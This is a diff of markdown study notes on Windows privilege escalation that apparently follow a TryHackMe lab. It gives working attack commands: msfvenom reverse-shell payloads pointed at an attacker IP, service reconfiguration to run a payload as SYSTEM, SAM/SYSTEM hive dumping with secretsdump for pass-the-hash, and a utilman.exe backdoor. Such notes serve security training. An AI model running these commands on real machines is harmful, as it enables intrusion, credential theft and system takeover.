@@ -21,7 +21,7 @@ Gaining access to different accounts can be as simple as finding credentials in 
 
 These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.
 
-## Harvesting Passwords from Usual Spots
+## Credential harvesting from usual spots
 The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.
 
 ### Unattended
@@ -78,7 +78,7 @@ While PuTTY won't allow users to store their SSH password, it will store proxy c
 To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command: `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`.
 
 ## Other quick wins
-### Scheduled tasks
+### Scheduled tasks (Windows's cronjobs)
 Look for a scheduled task that either lost its binary or a binary you can modify.
 Scheduled tasks can be listed from the command line using the `schtasks` command without any options.
 
@@ -133,7 +133,7 @@ As can be seen in the result, the `BUILTIN\Users` group has `full access (F)` ov
 This means we can modify the .bat file and insert any payload we like.
 All that's left to do is change the bat file to spawn a reverse shell.
 
-### AlwaysInstallElevated
+### AlwaysInstallElevated (.msi files run with elevated privileges)
 Windows installer files (also known as `.msi` files) are used to install applications on the system and usually run with the privilege level of the user that starts it.
 However, these can be configured to run with higher privileges from any user account (even unprivileged ones).
 This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
@@ -148,7 +148,11 @@ If these are set, you can generate a malicious .msi file using msfvenom:
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`
 
 ## Abusing Service Misconfigurations
-### Windows Services
+### What are Windows Services?
+- Services are `background processes that run without user interaction`.
+- They `often start automatically` and `run with system-level privileges` (e.g., LocalSystem, LocalService, or NetworkService accounts).
+- Misconfigured services can allow attackers to escalate privileges by abusing their properties.
+
 Windows services are managed by the `Service Control Manager (SCM)`.
 The SCM is a process in charge of managing the state of services as needed, `checking the current status of any given service` and generally `providing a way to configure services`.
 Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started.
@@ -173,7 +177,7 @@ SERVICE_NAME: apphostsvc
 
 Here we can see that the associated executable is specified through the `BINARY_PATH_NAME` parameter, and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.
 
-Services have a `Discretionary Access Control List (DACL)`, which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
+Services have a `Discretionary Access Control List` or [`DACL`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/acls-dacls-sacls-aces.html), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
 The DACL can be seen from Process Hacker (available on your machine's desktop):
 
 ![DACL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png)
@@ -188,7 +192,9 @@ If a DACL has been configured for the service, it will be stored in a subkey cal
 As you have guessed by now, only administrators can modify such registry entries by default.
 
 ### Insecure Permissions on Service Executable
-If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
+This vulnerability arises when the executable file of a service is `stored in a location with weak permissions`, allowing unauthorized users to replace it with a malicious file.
+
+To recap: if the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
 
 To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler.
 
@@ -203,3 +209,116 @@ Example:
 8. And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use `sc stop windowsscheduler` and then `sc start windowsscheduler`.
 
 ### Unquoted Service Paths
+When we can't directly write into service executables as before, there might still be a chance to `force a service into running arbitrary executables` by using a rather obscure feature.
+When working with Windows services, a very particular behaviour occurs when the service is configured to point to an `unquoted executable`.
+By unquoted, we mean that the `path of the associated executable isn't properly quoted to account for spaces on the command`.
+
+As an example, let's look at the difference between two services:
+
+- `BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service`, quoted.
+- `BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`, unquoted.
+
+When the SCM tries to execute the associated binary, a problem arises.
+Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes `ambiguous`, and the SCM doesn't know which of the following you are trying to execute:
+
+| Command | Argument 1 | Argument 2 |
+|-|-|-|
+| `C:\MyPrograms\Disk.exe` | `Sorter` | `Enterprise\bin\disksrs.exe` |
+| `C:\MyPrograms\Disk Sorter.exe` | `Enterprise\bin\disksrs.exe` |  |
+| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` |  |  |
+
+This has to do with how the command prompt parses a command. Usually, when you send a command, `spaces are used as argument separators` unless they are part of a quoted string.
+This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.
+
+Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
+
+1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
+2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
+3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.
+
+From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
+While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which `isn't writable by unprivileged users`.
+
+### Insecure Service Permissions
+You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted.
+Should the `service DACL` (`not the service's executable DACL`) allow you to modify the configuration of a service, you will be able to `reconfigure the service`.
+This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
+
+To check for a service DACL from the command line, you can use `Accesschk` from the `Sysinternals suite`.
+
+1. `accesschk64.exe -qlc thmservice`
+2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe`
+3. `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`
+4. `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`
+5. `sc stop THMService`
+6. `sc start THMService`
+7. `nc -lvp 4447`
+
+## Abusing dangerous privileges
+Each user has a set of assigned privileges that can be checked with the following command: `whoami /priv`.
+
+A complete list of available privileges on Windows systems is available [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
+You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin/tree/master) Github project.
+
+### SeBackup / SeRestore
+Allow users to read and write to any file in the system, ignoring any `DACL` in place.
+The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
+
+Having this power, an attacker can trivially escalate privileges on the system by using many techniques.
+The one we will look at consists of copying the `SAM` and `SYSTEM registry hives` to extract the local Administrator's password hash.
+
+1. We will need to open a command prompt using the "Open as administrator" option to use these privileges.
+2. `whoami /priv`
+3. Backup the `SAM` and `SYSTEM` hashes: `reg save hklm\system C:\Users\THMBackup\system.hive` & `reg save hklm\sam C:\Users\THMBackup\sam.hive`
+4. This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method.
+5. Use `impacket` to retrieve the users' password hashes: `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`.
+6. Use the Administrator's hash to perform a `Pass-the-Hash attack` and gain access to the target machine with SYSTEM privileges.
+
+### SeTakeOwnership
+Allows a user to take `ownership of any object on the system`, including `files` and `registry keys`.
+
+E.g: `utilman.exe`, a built-in Windows application used to provide Ease of Access options during the lock screen. Abuse it to escalate privileges this time.
+
+Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like.
+As we can take ownership of any file, replacing it is trivial.
+
+1. `takeown /f C:\Windows\System32\Utilman.exe`
+2. `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
+3. `copy cmd.exe utilman.exe`
+4. Lock the screen and click the "Ease of Access" button to trigger `utilman`.
+
+### Others / Summary
+| Privilege | Description | Abuse |
+|-|-|-|
+| `SeImpersonatePrivilege` | Allows a process to impersonate another user. | Exploited in token impersonation attacks (e.g., `JuicyPotato`, `RoguePotato`) to escalate to SYSTEM. |
+| `SeAssignPrimaryTokenPrivilege` | Allows a process to assign a token to a process. | Combined with SeImpersonatePrivilege for privilege escalation. |
+| `SeCreateTokenPrivilege` | Allows a user to create new tokens. | Exploited to create a new SYSTEM token and elevate privileges. |
+| `SeTakeOwnershipPrivilege` | Allows a user to take ownership of any object. | Can be used to take control of files or processes owned by SYSTEM. |
+| `SeDebugPrivilege` | Allows debugging of any process, including SYSTEM processes. | Exploited to inject code into SYSTEM processes or access sensitive data in memory. |
+| `SeLoadDriverPrivilege` | Allows loading of device drivers. | Exploited to load malicious drivers, which run in kernel mode (ring-0). |
+| `SeRestorePrivilege` | Allows restoring files or directories regardless of permissions. | Used to overwrite critical files, bypassing NTFS permissions. |
+| `SeShutdownPrivilege` | Allows shutting down the system. | Used for denial-of-service attacks. |
+
+## Abusing vulnerable software
+Software installed on the target system can present various privilege escalation opportunities.
+As with drivers, organisations and users may not update them as often as they update the operating system.
+You can use the `wmic` tool to list software installed on the target system and its versions.
+
+This command will dump information it can gather on installed software: `wmic product get name,version,vendor`.
+
+Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here.
+It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
+
+Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like `exploit-db`, `packet storm` or plain old `Google`, amongst many others.
+
+## Tools of the trade
+Various tools can help you conduct system enumeration to find privilege escalation vectors. Below are some commonly used tools along with their descriptions and usage.
+
+| **Tool** | **Description** | **Usage** |
+|-|-|-|
+| **WinPEAS** | A script that enumerates the target system to find privilege escalation paths. | - Download the precompiled executable or `.bat` script. <br> - Run: `winpeas.exe > outputfile.txt` <br> - Output may be long, so redirect to a file for easier review. |
+| **PrivescCheck** | A PowerShell script to search for common privilege escalation vectors. | - Run: `Set-ExecutionPolicy Bypass -Scope process -Force` <br> - Execute: `. .\PrivescCheck.ps1` <br> - Then, run: `Invoke-PrivescCheck` |
+| **WES-NG (Windows Exploit Suggester - Next Generation)** | A Python script that identifies missing patches and vulnerabilities on the target system. | - Update the database: `wes.py --update` <br> - Run `systeminfo` on the target machine and save output to `systeminfo.txt` <br> - Run: `wes.py systeminfo.txt` on the attacking machine. |
+| **Metasploit (multi/recon/local_exploit_suggester)** | A Metasploit module that suggests local exploits based on the target system's vulnerabilities. | - Use the `multi/recon/local_exploit_suggester` module if you have a Meterpreter shell on the target system to identify privilege escalation vectors. |
+
+> **Note:** Automated tools may not catch all potential escalation vectors, so manual enumeration is still recommended.
